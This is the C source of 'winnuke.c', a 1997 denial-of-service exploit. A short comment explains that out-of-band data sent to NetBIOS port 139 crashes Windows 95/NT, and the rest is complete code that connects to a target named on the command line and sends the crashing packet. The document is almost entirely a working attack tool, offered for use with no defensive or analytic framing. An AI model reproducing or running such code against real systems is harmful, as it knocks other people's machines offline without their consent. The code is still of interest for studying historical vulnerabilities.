/*
        It is possible to remotely cause denial of service to any windows
95/NT user.  It is done by sending OOB [Out Of Band] data to an
established connection you have with a windows user.  NetBIOS [139] seems
to be the most effective since this is a part of windows.  Apparently
windows doesn't know how to handle OOB, so it panics and crazy things
happen.  I have heard reports of everything from windows dropping carrier
to the entire screen turning white.  Windows also sometimes has trouble
handling anything on a network at all after an attack like this.  A
reboot fixes whatever damage this causes.  Code follows.


--- CUT HERE ---
*/
/* winnuke.c - (05/07/97)  By _eci  */
/* Tested on Linux 2.0.30, SunOS 5.5.1, and BSDI 2.1 */


#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

#define dport 139  /* Attack port: 139 is what we want */

int x, s;
char *str = "Bye";  /* Makes no diff */
struct sockaddr_in addr, spoofedaddr;
struct hostent *host;


int open_sock(int sock, char *server, int port) {
     struct sockaddr_in blah;
     struct hostent *he;
     bzero((char *)&blah,sizeof(blah));
     blah.sin_family=AF_INET;
     blah.sin_addr.s_addr=inet_addr(server);
     blah.sin_port=htons(port);


    if ((he = gethostbyname(server)) != NULL) {
        bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);
    }
    else {
         if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {
           perror("gethostbyname()");
           return(-3);
         }
    }

        if (connect(sock,(struct sockaddr *)&blah,16)==-1) {
             perror("connect()");
             close(sock);
             return(-4);
        }
        printf("Connected to [%s:%d].\n",server,port);
        return;
}


void main(int argc, char *argv[]) {

     if (argc != 2) {
       printf("Usage: %s <target>\n",argv[0]);
       exit(0);
     }

     if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
        perror("socket()");
        exit(-1);
     }

     open_sock(s,argv[1],dport);


     printf("Sending crash... ");
       send(s,str,strlen(str),MSG_OOB);
       usleep(100000);
     printf("Done!\n");
     close(s);
}

/*

